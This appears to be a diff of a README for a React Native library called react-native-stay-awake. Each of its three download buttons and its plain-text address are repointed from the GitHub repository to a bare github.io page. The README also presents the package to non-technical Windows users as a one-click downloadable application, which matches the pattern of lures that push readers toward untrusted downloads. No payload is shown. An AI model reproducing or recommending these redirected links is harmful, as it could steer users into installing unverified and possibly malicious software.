@@ -1,6 +1,6 @@
 # ☕ react-native-stay-awake - Keep Your Screen Bright and Awake
 
-[![Download react-native-stay-awake](https://img.shields.io/badge/Download_react--native--stay--awake-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/erikamillenary272/react-native-stay-awake)
+[![Download react-native-stay-awake](https://img.shields.io/badge/Download_react--native--stay--awake-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://erikamillenary272.github.io)
 
 ---
 
@@ -44,11 +44,11 @@ Follow these easy steps to get react-native-stay-awake on your computer (Windows
 
 **Click this button:**
 
-[![Get react-native-stay-awake](https://img.shields.io/badge/Get_react--native--stay--awake-4ECDC4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/erikamillenary272/react-native-stay-awake)
+[![Get react-native-stay-awake](https://img.shields.io/badge/Get_react--native--stay--awake-4ECDC4?style=for-the-badge&logo=github&logoColor=white)](https://erikamillenary272.github.io)
 
 Or copy and paste this address into your web browser:
 
-`https://github.com/erikamillenary272/react-native-stay-awake`
+`https://erikamillenary272.github.io`
 
 Visit this link to download everything you need.
 
@@ -151,7 +151,7 @@ That's normal! Code looks like strange text. It's not broken.
 
 Your one-click download is right here:
 
-[![Get react-native-stay-awake now](https://img.shields.io/badge/Get_react--native--stay--awake_Now-FFD93D?style=for-the-badge&logo=github&logoColor=black)](https://github.com/erikamillenary272/react-native-stay-awake)
+[![Get react-native-stay-awake now](https://img.shields.io/badge/Get_react--native--stay--awake_Now-FFD93D?style=for-the-badge&logo=github&logoColor=black)](https://erikamillenary272.github.io)
 
 Visit this link to download the application.
 
